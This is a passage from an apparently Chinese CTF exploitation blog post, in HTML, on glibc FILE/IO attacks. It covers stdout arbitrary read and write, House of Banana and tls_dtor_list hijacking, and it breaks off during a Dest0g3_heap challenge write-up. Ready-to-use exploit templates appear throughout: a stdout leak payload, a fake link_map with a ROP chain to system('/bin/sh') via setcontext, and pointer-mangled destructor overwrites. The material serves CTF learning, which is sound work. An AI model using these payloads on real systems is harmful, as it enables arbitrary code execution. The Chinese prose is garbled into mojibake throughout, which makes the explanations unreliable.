id="ä»»æ„å†™"><a class="header-anchor" href="#ä»»æ„å†™">Â¶</a><strong>ä»»æ„å†™</strong></h3><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¡Œç¼“å†²æ¨¡å¼ä¸‹ï¼Œåˆ¤æ–­è¾“å‡ºç¼“å†²åŒºè¿˜æœ‰å¤šå°‘ç©ºé—´ï¼Œç”¨çš„æ˜¯<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>ï¼Œè€Œåœ¨å…¨ç¼“å†²æ¨¡å¼ä¸‹ï¼Œç”¨çš„æ˜¯<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>ï¼Œè‹¥æ˜¯è¿˜æœ‰ç©ºé—´å‰©ä½™ï¼Œåˆ™ä¼šå°†è¦è¾“å‡ºçš„æ•°æ®å¤åˆ¶åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ï¼ˆæ­¤æ—¶ç”±<code>_IO_write_ptr</code>æ§åˆ¶ï¼Œå‘<code>_IO_write_ptr</code>æ‹·è´<code>count</code>é•¿åº¦çš„æ•°æ®ï¼‰ï¼Œå› æ­¤å¯é€šè¿‡è¿™ä¸€ç‚¹æ¥å®ç°ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼šä»¥å…¨ç¼“å†²æ¨¡å¼ä¸ºä¾‹ï¼Œåªéœ€å°†<code>_IO_write_ptr</code>æŒ‡å‘<code>write_start</code>ï¼Œ<code>_IO_write_end</code>æŒ‡å‘<code>write_end</code>å³å¯ã€‚<br>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰å®å®šä¹‰<code>#define _IO_LINE_BUF 0x0200</code>ï¼Œæ­¤å¤„<code>flag &amp; _IO_LINE_BUF</code>ä¸ºçœŸï¼Œåˆ™è¡¨ç¤º<code>flag</code>ä¸­åŒ…å«äº†<code>_IO_LINE_BUF</code>æ ‡è¯†ï¼Œå³å¼€å¯äº†è¡Œç¼“å†²æ¨¡å¼ï¼ˆå¯ç”¨<code>setvbuf(stdout,0,_IOLBF,1024)</code>å¼€å¯ï¼‰ï¼Œè‹¥è¦æ„é€ <code>flag</code>åŒ…å«<code>_IO_LINE_BUF</code>æ ‡è¯†ï¼Œåˆ™<code>flag |= 0x200</code>å³å¯ã€‚</p><h3 id="ä»»æ„è¯»"><a class="header-anchor" href="#ä»»æ„è¯»">Â¶</a><strong>ä»»æ„è¯»</strong></h3><p>å…ˆè®¨è®º<code>_IO_new_file_xsputn</code>æºä»£ç ä¸­<code>if (to_do + must_flush &gt; 0)</code>æœ‰å“ªäº›æƒ…å†µä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼š<br><strong>(a)</strong> é¦–å…ˆè¦æ˜ç¡®çš„æ˜¯<code>to_do</code>ä¸€å®šæ˜¯éè´Ÿæ•°ï¼Œå› æ­¤è‹¥<code>must_flush</code>ä¸º<code>1</code>çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼Œè€Œå†å¾€ä¸Šçœ‹ï¼Œå½“éœ€è¦è¾“å‡ºçš„å†…å®¹ä¸­æœ‰<code>\n</code>æ¢è¡Œç¬¦çš„æ—¶å€™å°±ä¼šéœ€è¦åˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼Œå³å°†<code>must_flush</code>è®¾ä¸º<code>1</code>ï¼Œæ•…å½“è¾“å‡ºå†…å®¹ä¸­æœ‰<code>\n</code>çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¯¥åˆ†æ”¯çš„å†…å®¹ï¼Œå¦‚ç”¨<code>puts</code>å‡½æ•°è¾“å‡ºå°±ä¸€å®šä¼šæ‰§è¡Œã€‚<br><strong>(b)</strong> è‹¥<code>to_do</code>å¤§äº<code>0</code>ï¼Œä¹Ÿä¼šæ‰§è¡Œè¯¥åˆ†æ”¯ä¸­çš„å†…å®¹ï¼Œå› æ­¤ï¼Œå½“ è¾“å‡ºç¼“å†²åŒºæœªå»ºç«‹ æˆ–è€… è¾“å‡ºç¼“å†²åŒºæ²¡æœ‰å‰©ä½™ç©ºé—´ æˆ–è€… è¾“å‡ºç¼“å†²åŒºå‰©ä½™çš„ç©ºé—´ä¸å¤Ÿä¸€æ¬¡æ€§å°†ç›®æ ‡åœ°å€ä¸­çš„æ•°æ®å®Œå…¨æ‹·è´è¿‡æ¥ çš„æ—¶å€™ï¼Œä¹Ÿä¼šæ‰§è¡Œè¯¥<code>if</code>åˆ†æ”¯ä¸­çš„å†…å®¹ã€‚<br>è€Œè¯¥<code>if</code>åˆ†æ”¯ä¸­ä¸»è¦è°ƒç”¨äº†<code>_IO_OVERFLOW()</code>æ¥åˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼Œè€Œåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨<code>_IO_do_write()</code>è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚</p><p>ç›¸å…³æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="hljs-type">int</span> ch)<br>&#123;<br>  <span class="hljs-comment">// åˆ¤æ–­æ ‡å¿—ä½æ˜¯å¦åŒ…å«_IO_NO_WRITES =&gt; _flagséœ€è¦ä¸åŒ…å«_IO_NO_WRITES</span><br>  <span class="hljs-keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)<br>    &#123;<br>      f-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// åˆ¤æ–­è¾“å‡ºç¼“å†²åŒºæ˜¯å¦ä¸ºç©º ä»¥åŠ æ˜¯å¦ä¸åŒ…å«_IO_CURRENTLY_PUTTINGæ ‡å¿—ä½</span><br>  <span class="hljs-comment">// ä¸ºäº†ä¸æ‰§è¡Œè¯¥ifåˆ†æ”¯ä»¥å…å‡ºé”™ï¼Œæœ€å¥½å®šä¹‰ _flags åŒ…å« _IO_CURRENTLY_PUTTING</span><br>  <span class="hljs-keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="hljs-number">0</span> || f-&gt;_IO_write_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>    &#125;<br>  <span class="hljs-comment">// è°ƒç”¨_IO_do_write è¾“å‡º è¾“å‡ºç¼“å†²åŒº</span><br>  <span class="hljs-comment">// ä»_IO_write_baseå¼€å§‹ï¼Œè¾“å‡º(_IO_write_ptr - f-&gt;_IO_write_base)ä¸ªå­—èŠ‚çš„æ•°æ®</span><br>  <span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) ch;<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> _IO_size_t <span class="hljs-title function_">new_do_write</span> <span class="hljs-params">(_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data, _IO_size_t to_do)</span><br>&#123;<br>  ...<br>  _IO_size_t count;<br>  <span class="hljs-comment">// ä¸ºäº†ä¸æ‰§è¡Œelse ifåˆ†æ”¯ä¸­çš„å†…å®¹ä»¥äº§ç”Ÿé”™è¯¯ï¼Œå¯æ„é€ _flagsåŒ…å«_IO_IS_APPENDING æˆ– è®¾ç½®_IO_read_endç­‰äº_IO_write_base</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<br>    fp-&gt;_offset = _IO_pos_BAD;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)<br>    &#123;<br>      _IO_off64_t new_pos<br>    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      fp-&gt;_offset = new_pos;<br>    &#125;<br>  <span class="hljs-comment">// è°ƒç”¨å‡½æ•°è¾“å‡ºè¾“å‡ºç¼“å†²åŒº</span><br>  count = _IO_SYSWRITE (fp, data, to_do);<br>  ...<br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œä¸ºäº†åšåˆ°<strong>ä»»æ„è¯»</strong>ï¼Œæ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼Œå³å¯è¿›è¡Œåˆ©ç”¨ï¼š<br>(1) è®¾ç½®<code>_flag &amp;~ _IO_NO_WRITES</code>ï¼Œå³<code>_flag &amp;~ 0x8</code>ï¼›<br>(2) è®¾ç½®<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>ï¼Œå³<code>_flag | 0x800</code>ï¼›<br>(3) è®¾ç½®<code>_fileno</code>ä¸º<code>1</code>ï¼›<br>(4) è®¾ç½®<code>_IO_write_base</code>æŒ‡å‘æƒ³è¦æ³„éœ²çš„åœ°æ–¹ï¼Œ<code>_IO_write_ptr</code>æŒ‡å‘æ³„éœ²ç»“æŸçš„åœ°å€ï¼›<br>(5) è®¾ç½®<code>_IO_read_end</code>ç­‰äº<code>_IO_write_base</code> æˆ– è®¾ç½®<code>_flag &amp; _IO_IS_APPENDING</code>å³ï¼Œ<code>_flag | 0x1000</code>ã€‚<br>æ­¤å¤–ï¼Œæœ‰ä¸€ä¸ªå¤§å‰æï¼šéœ€è¦è°ƒç”¨<code>_IO_OVERFLOW()</code>æ‰è¡Œï¼Œå› æ­¤éœ€ä½¿å¾—éœ€è¦è¾“å‡ºçš„å†…å®¹ä¸­å«æœ‰<code>\n</code>æ¢è¡Œç¬¦ æˆ– è®¾ç½®<code>_IO_write_end</code>ç­‰äº<code>_IO_write_ptr</code>ï¼ˆè¾“å‡ºç¼“å†²åŒºæ— å‰©ä½™ç©ºé—´ï¼‰ç­‰ã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼Œç»å¸¸åˆ©ç”¨<code>puts</code>å‡½æ•°åŠ ä¸Šè¿°<code>stdout</code>ä»»æ„è¯»çš„æ–¹å¼æ³„éœ²<code>libc</code>ã€‚<br><code>_flag</code>çš„æ„é€ éœ€æ»¡è¶³çš„æ¡ä»¶:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_flags = <span class="hljs-number">0xfbad0000</span> <br>_flags &amp; = ~_IO_NO_WRITES <span class="hljs-comment">// _flags = 0xfbad0000</span><br>_flags | = _IO_CURRENTLY_PUTTING <span class="hljs-comment">// _flags = 0xfbad0800</span><br>_flags | = _IO_IS_APPENDING <span class="hljs-comment">// _flags = 0xfbad1800</span><br></code></pre></td></tr></table></figure><p>å› æ­¤ï¼Œä¾‹å¦‚åœ¨<code>libc-2.27</code>ä¸‹ï¼Œæ„é€ <code>payload = p64(0xfbad1800) + p64(0)*3 + b'\x58'</code>ï¼Œæ³„éœ²å‡ºçš„ç¬¬ä¸€ä¸ªåœ°å€å³ä¸º<code>_IO_file_jumps</code>çš„åœ°å€ã€‚<br>æ­¤å¤–ï¼Œ<code>_flags</code>ä¹Ÿå¯å†åŠ ä¸€äº›å…¶ä»–æ— å…³ç´§è¦çš„éƒ¨åˆ†ï¼Œå¦‚è®¾ç½®ä¸º<code>0xfbad1887</code>ï¼Œ<code>0xfbad1880</code>ï¼Œ<code>0xfbad3887</code>ç­‰ç­‰ã€‚</p><h1>[ç•ªå¤–ç¯‡]Exit è‰ºæœ¯é‰´èµ</h1><p>ğŸ‘´ ä¸æƒ³å¼€æ–°çš„æ–‡ç« ï¼Œä½•å†µ exit å’Œ IO åœ¨æŸäº›åœºåˆè”ç³»æ¯”è¾ƒç´§ã€‚</p><p>ä¸‹é¢æ‰€æœ‰åˆ©ç”¨æ‰‹æ³•çš„æ¡ä»¶ç›¸å¯¹ç»Ÿä¸€ã€‚</p><ol><li>èƒ½ä»ä¸»å‡½æ•°è¿”å›æˆ–è¿›å…¥ exit</li><li>ä¸€æ¬¡ Largebin Attack æˆ–ä»»æ„å†™ï¼ˆlibc åœ°å€å’Œ heap åœ°å€è¦æœ‰ï¼‰</li></ol><h2 id="Hosue-of-Banana"><a class="header-anchor" href="#Hosue-of-Banana">Â¶</a>Hosue of Banana</h2><p>è¿™ç©æ„å•è°ˆåˆ©ç”¨ä¸éš¾ï¼Œç»“æ„ä½“ ğŸ‘´ è¯´å®è¯çœ‹çš„ä¼¼æ‡‚éæ‡‚ï¼Œä½†æ˜¯ ğŸ‘´ ä¸€è°ƒè¯•å°±çŸ¥é“å“ªé‡Œå¯ä»¥æ‰“éªšæ“ä½œï¼Œåªè¦åŠ«æŒæ‰ç›¸å…³æŒ‡é’ˆå°±å¥½äº†ã€‚è°ƒè¯•æ²¡å†™å°±æ˜¯è¿˜åœ¨å’•ã€‚</p><p>æ‹¿ä¸‹é¢æ¨¡æ¿çš„è¯è®°å¾—è‡ªå·±æ”¹æ”¹ï¼Œä¸ç„¶å’±wpæ’äº†è›®å°´å°¬ = =</p><h3 id="æ€è·¯-v4"><a class="header-anchor" href="#æ€è·¯-v4">Â¶</a>æ€è·¯</h3><p>å°±ç®—ä½ ç°åœ¨æ²¡æ—¶é—´å»è°ƒè¯•ï¼Œæ‹¿ä¸‹é¢çš„æ¨¡æ¿ï¼ŒæŒ‰è¿™ä¸ªæ­¥éª¤å°±èƒ½å®Œæˆæ ˆè¿ç§»ï¼š</p><ol><li>Largebin Attack æ‰“ <code>_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>ã€‚</li><li>ä¸‹é¢çš„ link_4_addr æ”¹æˆ Largebin(Chunk2) çš„ <strong>chunkå¤´</strong> åœ°å€</li><li>åˆ©ç”¨ Chunk1 åœ¨ Chunk2 çš„ prev_data ä½ç½®å†™ä¸Š p64(link_4_addr + 0x20)</li><li>èµ° exit è§¦å‘ SROP å®Œæˆæ ˆè¿ç§»ï¼Œæˆ–è€…æ”¹æ‰ä¸‹é¢æ ‡æ³¨çš„ RIP ï¼Œèµ°è‡ªå·±çš„å¥‡å¥‡æ€ªæ€ª</li></ol><h3 id="SROP-æ ˆè¿ç§»"><a class="header-anchor" href="#SROP-æ ˆè¿ç§»">Â¶</a>SROP æ ˆè¿ç§»</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">rop_chain = flat(pop_rdi_ret,bin_sh,ret,system_addr)<br>link_4_addr = heap_base + <span class="hljs-number">0xcd0</span><br>fake_link_map = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(link_4_addr)<br>fake_link_map += p64(magic) + p64(ret)<span class="hljs-comment"># magic = setcontext+61</span><br>fake_link_map += p64(<span class="hljs-number">0</span>)<br>fake_link_map += rop_chain<br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0xc8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x28</span> + <span class="hljs-number">0x18</span>) <span class="hljs-comment"># RSP</span><br>fake_link_map += p64(pop_rdi_ret)   <span class="hljs-comment"># RCX RIP</span><br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p64(link_4_addr + <span class="hljs-number">0x10</span> + <span class="hljs-number">0x110</span>)*<span class="hljs-number">0x3</span><br>fake_link_map += p64(<span class="hljs-number">0x10</span>)  <br>fake_link_map = fake_link_map.ljust(<span class="hljs-number">0x31C</span> - <span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_link_map += p8(<span class="hljs-number">0x8</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(link_4_addr + <span class="hljs-number">0x20</span>))<br>edit(<span class="hljs-number">2</span>,fake_link_map)<br></code></pre></td></tr></table></figure><h2 id="tls-dtor-list"><a class="header-anchor" href="#tls-dtor-list">Â¶</a>tls_dtor_list</h2><p>ğŸ‘´ ä¹ŸçŸ¥é“è¿™ç©æ„ä¹Ÿä¸æ˜¯ IOï¼Œä½†ä¹Ÿæ‰”è¿™ã€‚</p><h3 id="æ¡ä»¶"><a class="header-anchor" href="#æ¡ä»¶">Â¶</a>æ¡ä»¶</h3><ol><li>èƒ½ä»ä¸»å‡½æ•°è¿”å›æˆ–è¿›å…¥ exit</li><li>ä¿©æ¬¡ Largebin Attack æˆ–ä»»æ„å†™ï¼ˆlibc åœ°å€å’Œ heap åœ°å€è¦æœ‰ï¼‰ï¼Œä¸€æ¬¡å†™ fskeyï¼Œä¸€æ¬¡å†™ tls_dtor_list æŒ‡é’ˆ</li></ol><h3 id="æºç "><a class="header-anchor" href="#æºç ">Â¶</a>æºç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// glibc-2.35/stdlib/cxa_thread_atexit_impl.c</span><br><span class="hljs-comment">/* Call the destructors.  This is called either when a thread returns from the</span><br><span class="hljs-comment">   initial function or when the process exits via the exit function.  */</span><br><span class="hljs-type">void</span><br>__call_tls_dtors (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-keyword">while</span> (tls_dtor_list)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dtor_list</span> *<span class="hljs-title">cur</span> =</span> tls_dtor_list;<br>      dtor_func func = cur-&gt;func;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>      PTR_DEMANGLE (func);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      tls_dtor_list = tls_dtor_list-&gt;next;<br>      func (cur-&gt;obj);<br><br>      <span class="hljs-comment">/* Ensure that the MAP dereference happens before</span><br><span class="hljs-comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span><br><span class="hljs-comment"> potential DSO unload in _dl_close_worker, which happens when</span><br><span class="hljs-comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span><br>      atomic_fetch_add_release (&amp;cur-&gt;<span class="hljs-built_in">map</span>-&gt;l_tls_dtor_count, <span class="hljs-number">-1</span>);<br>      <span class="hljs-built_in">free</span> (cur);<br>    &#125;<br>&#125;<br>libc_hidden_def (__call_tls_dtors)<br></code></pre></td></tr></table></figure><h3 id="è°ƒè¯•-v4"><a class="header-anchor" href="#è°ƒè¯•-v4">Â¶</a>è°ƒè¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; b __call_tls_dtors<br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x7ffff7dd1d60</span>: file ./stdlib/cxa_thread_atexit_impl.c, line <span class="hljs-number">149.</span><br></code></pre></td></tr></table></figure><p>ä¸€æ¬¡æ‰“ fskeyï¼Œé€šè¿‡ canary æˆ–è€… fsbase å¯»å€ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205843557.png" alt="image-20220721205843557"></p><p>ä¸€æ¬¡æ‰“ tls_dtor_listã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721205926990.png" alt="image-20220721205926990"></p><p>åœ¨æµç¨‹ä¸­ä¼šä» Largebin çš„ prev_data ä½ç½®æ‹¿ rax ï¼Œbk ä½ç½®æ‹¿ rdxã€‚ï¼ˆsizeä½ç½®æ‹¿ rdiï¼‰</p><p>è€ƒè™‘ï¼š</p><ol><li>ç®€å•çš„é€šè¿‡å‰ä¸€å †å—å†™ prev_dataï¼ŒLargebin å†™ bkï¼Œåˆ©ç”¨ setcontext + 61 èµ° SROP</li><li>æ¢å¤ Largebinï¼Œç”³è¯·å‡ºä¸åŒ size çš„ï¼Œå†™ system å’Œ <code>/bin/sh</code> åˆ†åˆ«åœ¨ä¿©ä½ç½® getshell</li></ol><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210027171.png" alt="image-20220721210027171"></p><p>å®Œæˆæ§åˆ¶æµåŠ«æŒã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220721210316505.png" alt="image-20220721210316505"></p><h3 id="SROP-æ ˆè¿ç§»-v2"><a class="header-anchor" href="#SROP-æ ˆè¿ç§»-v2">Â¶</a>SROP æ ˆè¿ç§»</h3><p>å¸ƒå±€ï¼š</p><ol><li>Chunk1 æ˜¯ç”¨æ¥è¦†å†™ Chunk2 çš„ prev_data éƒ¨åˆ†</li><li>Chunk2 æ˜¯ç”¨æ¥ Largebin Attack çš„ Largebin</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x520</span>+p64(rol(magic^(fskey),<span class="hljs-number">0x11</span>,<span class="hljs-number">64</span>)))<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">1</span>+p64(heap_base+<span class="hljs-number">0xcd0</span>))<br></code></pre></td></tr></table></figure><h1>ç»å…¸ä¾‹é¢˜é‰´èµ</h1><h2 id="Dest0g3-heap"><a class="header-anchor" href="#Dest0g3-heap">Â¶</a>Dest0g3_heap</h2><p>è¿™é¢˜ ğŸ‘´ è‚¯å®šåšéº»çƒ¦äº†ï¼Œä½†æ˜¯ ğŸ‘´ æ‰“çš„å¾ˆçˆ½ã€‚</p><p>å‡ºè‡ª BUUCTF çš„ <a href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520è¿æ–°èµ›</a>ã€‚è¿™é¢˜å¦‚æœæ”¾åˆ° 2.34 ä¸”å¼€æ²™ç®±ï¼Œå°†æ˜¯ç»æ€ï¼ŒğŸ‘´ ä¾¿æ„¿ç§°ä¹‹ä¸º <strong>IO ä¸“é¡¹è®­ç»ƒ</strong>ã€‚å¯æƒœæ”¾ä¸å¾—ã€‚</p><p>ä½†æ˜¯ ğŸ‘´ è¿™é‡Œè¿˜æ˜¯è‡ªå·±åˆ†åˆ«å‡è£…æ‰“ä¸€ä¸‹æ²¡æœ‰å¼€äº†æ²™ç®±çš„æƒ…å½¢å’Œæ²¡æœ‰ <strong>hook</strong> å¼€äº†æ²™ç®±çš„æƒ…å½¢ï¼Œé—®å°±æ˜¯ ğŸ‘´ ä¸æƒ³è‡ªå·±æ•´ demo äº†ã€‚</p><h3 id="åˆ†æ-v4"><a class="header-anchor" href="#åˆ†æ-v4">Â¶</a>åˆ†æ</h3><p>ç¨‹åºæ¯”è¾ƒæœ‰æ„æ€ï¼Œmmap äº†ä¸€å—ç©ºé—´ï¼Œåœ¨å…¶ä¸Šæˆ‘ä»¬å¯ä»¥ä»»æ„ edit å’Œ free ã€‚ä½†æ˜¯ç»™æˆ‘ä»¬çš„ add æ˜¯ calloc ä¸€ä¸ªå †å—ï¼Œå¯¹æˆ‘ä»¬å½±å“å¾ˆå¤§ã€‚ ç„¶åç»™çš„ show ä¹Ÿæ˜¯ show å’± calloc çš„å †å—ï¼Œæ‰€ä»¥æœ‰ç‚¹é˜´é—´ã€‚</p><h4 id="Init"><a class="header-anchor" href="#Init">Â¶</a>Init</h4><p><strong>setvbuf</strong> ğŸ‘´ ä¹Ÿè§å¾—å¤šäº†ï¼Œè¿™ âœ”ï¸ 8ï¸âƒ£ ç©æ„ç”¨åœ¨ stdin å’Œ stdout ç‰¹åˆ«åˆé€‚ï¼Œå¯ä»¥è§£å†³è¿œç«¯äº¤äº’çš„é—®é¢˜ã€‚ä½†æ˜¯å®ƒä¼šæŠŠæŒ‡é’ˆæ”¾åˆ° bss æ®µä¸Šï¼Œç”¨åœ¨ <strong>stderr</strong> ä¼šè®© ğŸ‘´ ğŸ‘ <strong>Emma</strong> çš„éš¾åº¦å¢åŠ ã€‚è¿™å‡½æ•°å°±æ˜¯ mmap äº†ä¸€å—å¯è¯»å¯å†™çš„åŒºåŸŸï¼Œç”¨ä½œæˆ‘ä»¬è‡ªå·±çš„å †ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_121A</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    error(<span class="hljs-string">&quot;File urandom Open Failed&quot;</span>);<br>  read(fd, &amp;buf, <span class="hljs-number">5uLL</span>);<br>  Heap_arena = (__int64)mmap((<span class="hljs-type">void</span> *)(buf &amp; <span class="hljs-number">0xFFFFFFFFF000</span>LL), <span class="hljs-number">0x3000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Add"><a class="header-anchor" href="#Add">Â¶</a>Add</h4><p><strong>calloc</strong> å°±ç®—äº†ï¼Œè¿™ç©æ„ add çš„æ—¶å€™æ²¡æœ‰ç»™ ğŸ‘´ è¾“å…¥æ•°æ®çš„æœºä¼šï¼ŒğŸ‘´ æœ‰ç‚¹éš¾å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 